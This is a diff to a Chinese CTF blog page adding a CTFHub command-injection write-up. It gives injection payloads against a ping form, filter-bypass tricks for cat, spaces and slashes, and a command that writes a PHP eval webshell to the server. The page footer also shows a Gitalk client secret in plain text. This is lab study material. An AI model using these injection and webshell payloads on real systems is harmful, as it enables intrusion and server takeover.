@@ -60,6 +60,11 @@
 <li><a href="#phpinput">php://input</a></li>
 <li><a href="#读取源代码">读取源代码</a></li>
 <li><a href="#远程包含">远程包含</a></li>
+<li><a href="#命令注入">命令注入</a></li>
+<li><a href="#过滤cat">过滤cat</a></li>
+<li><a href="#过滤空格-1">过滤空格</a></li>
+<li><a href="#过滤目录分割符">过滤目录分割符</a></li>
+<li><a href="#过滤运算符">过滤运算符</a></li>
 </ul>
 </li>
 </ul>
@@ -483,6 +488,59 @@
 </li>
 </ul>
 <p><a href="https://www.wolai.com/ctfhub/64arrieDUUPZTc1eFm6LLC" target="_blank" rel="noopener">参考答案</a></p>
+<h4><span id="命令注入">命令注入</span></h4><p> 命令行注入漏洞是指web应用程序中调用了系统可执行命令的函数，而且输入参数是可控的，如果黑客拼接了注入命令，就可以进行非法操作了。</p>
+<p><strong>Windows系统支持的管道符如下：</strong></p>
+<ol>
+<li>“|”：直接执行后面的语句。</li>
+<li>“||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。</li>
+<li>“&amp;”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。</li>
+<li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li>
+</ol>
+<p><strong>Linux系统支持的管道符如下：</strong></p>
+<ol>
+<li>“;”：执行完前面的语句再执行后面的语句。</li>
+<li>“|”：显示后面语句的执行结果。</li>
+<li>“||”：当前面的语句执行出错时，执行后面的语句。</li>
+<li>“&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。</li>
+<li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li>
+</ol>
+<ul>
+<li><p>解法一：使用base64编码</p>
+<ul>
+<li><p>我们在框内输入</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> | ls # 输出两个php文件</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> | ls / #根目录没发现其他可疑文件</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; cat <span class="number">31007322329204</span>.php # 未回显</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; cat <span class="number">31007322329204</span>.php | base64 #使用base64编码</span><br><span class="line"># 解码后获得&lt;?php // ctfhub&#123;ed09b50ed879851ad5b5a4d9&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>解法二：重定向</p>
+<ul>
+<li>我们可以用重定向的方法注入一个一句话木马</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&amp;<span class="built_in">echo</span> -e "&lt;?php @eval(\$_POST['test']);?&gt;" &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用蚁剑连接即可</li>
+</ul>
+</li>
+</ul>
+<h4><span id="过滤cat">过滤cat</span></h4><p>3.使用单引号绕过 </p>
+<p>127.0.0.1; c’’at flag_2287214057241.php |base64<br>4.使用双引号绕过 </p>
+<p>127.0.0.1; c””at flag_2287214057241.php |base64<br>5.利用Shell 特殊变量绕过</p>
+<p>127.0.0.1; ca$@t flag_2287214057241.php|base64</p>
+<h4><span id="过滤空格">过滤空格</span></h4><p>空格可以用以下字符代替：<br><code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS</code>等</p>
+<p>$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，因此这里加一个{}就固定了变量名。<br>同理，在后面加个$可以起到截断的作用，使用$9是因为它是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p>
+<h4><span id="过滤目录分割符">过滤目录分割符</span></h4><p>思路上来说应该是cat文件，必须要使用目录分隔符/，但是题目给过滤。需要另外寻找办法  </p>
+<ul>
+<li>法一：使用cd绕开</li>
+</ul>
+<p>linux中：<code>%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</code></p>
+<p>windows中：<code>%0a、&amp;、|</code></p>
+<p>其中分号;的作用就是在 shell 中，担任”连续指令”功能</p>
+<p>&amp;&amp;的方式：command1 &amp;&amp; command2 如果command1执行成功，则执行command2</p>
+<p><code>;cd flag_is_here;cat flag_164641924722716.php|base64</code></p>
+<h4><span id="过滤运算符">过滤运算符</span></h4><ul>
+<li>发现题目没有过滤<code>;</code>因此我们可以直接使用</li>
+</ul>
 <h1><span id="reverse">Reverse</span></h1><h1><span id="crypto">Crypto</span></h1><h1><span id="misc">Misc</span></h1></div><div class="tags"><a href="/tags/ctf/"><i class="fa fa-tag"></i>ctf</a></div><div class="post-nav"><a class="next" href="/2022/12/23/Spring%20Security/">Spring Security</a></div><div id="container"></div><link rel="stylesheet" type="text/css" href="//unpkg.com/gitalk/dist/gitalk.css?v=0.0.0"><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=0.0.0"></script><script type="text/javascript" src="//unpkg.com/gitalk/dist/gitalk.min.js?v=0.0.0"></script><script>var gitalk = new Gitalk({
   clientID: 'd154fff64901622afbb6',
   clientSecret: '5b3f1d58c331b54703e4477e1f8fa1e42e9c1082',
